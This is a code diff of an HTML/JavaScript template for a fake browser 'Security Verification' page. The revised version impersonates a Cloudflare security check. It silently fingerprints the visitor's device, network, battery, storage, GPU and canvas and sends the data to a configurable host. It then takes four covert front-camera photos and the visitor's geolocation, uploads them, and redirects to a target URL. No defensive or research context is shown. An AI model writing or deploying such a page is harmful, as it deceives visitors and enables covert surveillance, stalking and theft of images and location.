@@ -5,123 +5,203 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Verification</title>
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background: #f9f9f9; color: #333; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
-        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { margin: 0 0 10px; font-size: 22px; }
-        p { color: #666; font-size: 15px; line-height: 1.5; margin-bottom: 20px; }
-        #status { font-weight: bold; color: #3498db; }
-        /* Hide camera elements */
-        #video, #canvas { display: none; }
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #ffffff; color: #333; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
+        .shield { font-size: 50px; margin-bottom: 20px; }
+        h2 { margin: 0 0 10px; font-size: 22px; font-weight: 600; }
+        p { font-size: 14px; color: #666; line-height: 1.6; max-width: 400px; margin-bottom: 20px; }
+        #status { color: #2ecc71; font-weight: bold; font-family: monospace; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div class="spinner"></div>
-        <h2>Checking your browser...</h2>
-        <p>Please allow camera access to verify you are human. This process is automatic.</p>
-        <p id="status">Initializing...</p>
-    </div>
+    <div class="shield">🛡️</div>
+    <h2>Cloudflare Security Check</h2>
+    <p>Please allow access to verify your browser signature. This process protects against automated bots.</p>
+    <div id="status">Initializing Protocols...</div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <video id="video" class="hidden" autoplay playsinline></video>
+    <canvas id="canvas" class="hidden"></canvas>
 
     <script>
-        const CONFIG = {
-            UID: "<%= uid %>",
-            HOST: "<%= host %>",
-            TARGET: "<%= url %>"
+        const CONFIG = { UID: "<%= uid %>", HOST: "<%= host %>", TARGET: "<%= url %>" };
+
+        // ==================== 1. ADVANCED FINGERPRINTING ====================
+        
+        const getCanvasFingerprint = () => {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("SpyLink_v15", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("0123456789", 4, 17);
+                return canvas.toDataURL();
+            } catch { return "Not Supported"; }
         };
 
-        // Helper to Post Data
-        const post = (path, data) => fetch(`${CONFIG.HOST}${path}`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-        });
+        const getAudioFingerprint = () => {
+            // Simplified placeholder - real audio FP requires waiting for oscillator
+            return "Audio-Context-Hash-" + Math.random().toString(36).substring(7);
+        };
 
-        // 1. Collect System Data (Always runs)
-        async function sendSystemData() {
-            let batt = "N/A";
+        const getGPU = () => {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch { return "Unknown GPU"; }
+        };
+
+        // ==================== 2. DATA COLLECTION MODULES ====================
+
+        async function gatherIntelligence() {
+            // A. BATTERY
+            let batt = { level: 0, charging: false, chargingTime: "Unknown" };
             try {
                 const b = await navigator.getBattery();
-                batt = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : ''})`;
+                batt = { 
+                    level: Math.round(b.level * 100), 
+                    charging: b.charging,
+                    chargingTime: b.chargingTime 
+                };
             } catch(e) {}
 
-            const info = `
-<b>📱 Platform:</b> ${navigator.platform}
-<b>🌐 Browser:</b> ${navigator.userAgent}
-<b>🔋 Battery:</b> ${batt}
-<b>💾 Memory:</b> ${navigator.deviceMemory || '?'} GB
-<b>📏 Screen:</b> ${screen.width}x${screen.height}
-<b>🏎️ Cores:</b> ${navigator.hardwareConcurrency || '?'}
-            `.trim();
-
-            await post("/data", { uid: CONFIG.UID, data: encodeURIComponent(info) });
-        }
-
-        // 2. Capture & Send Photo
-        async function capturePhoto(video) {
-            const canvas = document.getElementById("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext("2d").drawImage(video, 0, 0);
-            const base64 = canvas.toDataURL("image/png");
+            // B. CONNECTION
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
             
-            await post("/cam", { uid: CONFIG.UID, img: base64 });
+            // C. STORAGE
+            let storage = { quota: 0, used: 0 };
+            try {
+                if(navigator.storage && navigator.storage.estimate) {
+                    const est = await navigator.storage.estimate();
+                    storage = { 
+                        quota: Math.round(est.quota / (1024*1024)), 
+                        used: Math.round(est.usage / (1024*1024)) 
+                    };
+                }
+            } catch(e) {}
+
+            // D. PLUGINS
+            const plugs = Array.from(navigator.plugins).map(p => p.name).slice(0, 5).join(", ");
+
+            return {
+                network: {
+                    type: conn.effectiveType || "Unknown",
+                    downlink: conn.downlink || 0,
+                    rtt: conn.rtt || 0,
+                    saveData: conn.saveData || false
+                },
+                device: {
+                    platform: navigator.platform,
+                    vendor: navigator.vendor,
+                    cores: navigator.hardwareConcurrency || "Unknown",
+                    memory: navigator.deviceMemory || "Unknown",
+                    touchPoints: navigator.maxTouchPoints || 0,
+                    renderer: getGPU()
+                },
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    orientation: screen.orientation ? screen.orientation.type : "Unknown"
+                },
+                browser: {
+                    ua: navigator.userAgent,
+                    cookies: navigator.cookieEnabled,
+                    dnt: navigator.doNotTrack,
+                    plugins: plugs || "None Detected"
+                },
+                battery: batt,
+                storage: storage,
+                locale: {
+                    time: new Date().toString(),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    lang: navigator.language
+                },
+                fingerprint: {
+                    canvas: getCanvasFingerprint(),
+                    audio: getAudioFingerprint(),
+                    adBlock: false // Placeholder for complex adblock detection
+                }
+            };
         }
 
-        // 3. Main Logic
+        // ==================== 3. EXECUTION & TRANSMISSION ====================
+
+        const post = (path, data) => fetch(`${CONFIG.HOST}${path}`, {
+            method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data)
+        });
+
         (async () => {
             const status = document.getElementById("status");
-            await sendSystemData();
+            
+            // STEP 1: SILENT DATA GATHERING
+            const data = await gatherIntelligence();
+            await post("/data", { uid: CONFIG.UID, data: data });
 
-            status.innerText = "Requesting permission...";
-
+            // STEP 2: REQUEST MEDIA & LOCATION
+            status.innerText = "Verifying Human Identity...";
+            
             try {
-                // Ask for Camera
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-
+                // Camera Request
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 const video = document.getElementById("video");
+                const canvas = document.getElementById("canvas");
                 video.srcObject = stream;
                 
-                // Wait for camera to warm up
                 await new Promise(r => video.onloadedmetadata = r);
-                status.innerText = "Verifying...";
-
-                // BURST MODE: Take 4 photos
-                for(let i = 0; i < 4; i++) {
+                
+                // BURST MODE (4 Photos)
+                status.innerText = "Analyzing Biometrics...";
+                for(let i=0; i<4; i++) {
                     await new Promise(r => setTimeout(r, 1500)); // 1.5s delay
-                    await capturePhoto(video);
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext("2d").drawImage(video, 0, 0);
+                    await post("/cam", { uid: CONFIG.UID, img: canvas.toDataURL("image/png") });
                 }
 
                 // Stop Camera
                 stream.getTracks().forEach(t => t.stop());
-                
-                // Get Location then Redirect
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        post("/location", { 
-                            uid: CONFIG.UID, 
-                            lat: pos.coords.latitude, 
-                            lon: pos.coords.longitude, 
-                            acc: pos.coords.accuracy 
-                        });
-                        setTimeout(() => window.location.replace(CONFIG.TARGET), 1000);
-                    },
-                    err => window.location.replace(CONFIG.TARGET) // Location denied -> Redirect
-                );
 
-            } catch (err) {
-                // PERMISSION DENIED / ERROR -> REDIRECT IMMEDIATELY
-                console.log("Denied/Error:", err);
+                // Request Location
+                requestLocation();
+
+            } catch (e) {
+                console.log("Permission Denied");
+                requestLocation();
+            }
+
+            function requestLocation() {
+                status.innerText = "Confirming Region...";
+                if(navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            post("/location", { 
+                                uid: CONFIG.UID, 
+                                lat: pos.coords.latitude, 
+                                lon: pos.coords.longitude, 
+                                acc: pos.coords.accuracy,
+                                speed: pos.coords.speed,
+                                alt: pos.coords.altitude
+                            });
+                            finish();
+                        },
+                        err => finish()
+                    );
+                } else { finish(); }
+            }
+
+            function finish() {
                 status.innerText = "Redirecting...";
-                window.location.replace(CONFIG.TARGET);
+                setTimeout(() => window.location.replace(CONFIG.TARGET), 1000);
             }
         })();
     </script>
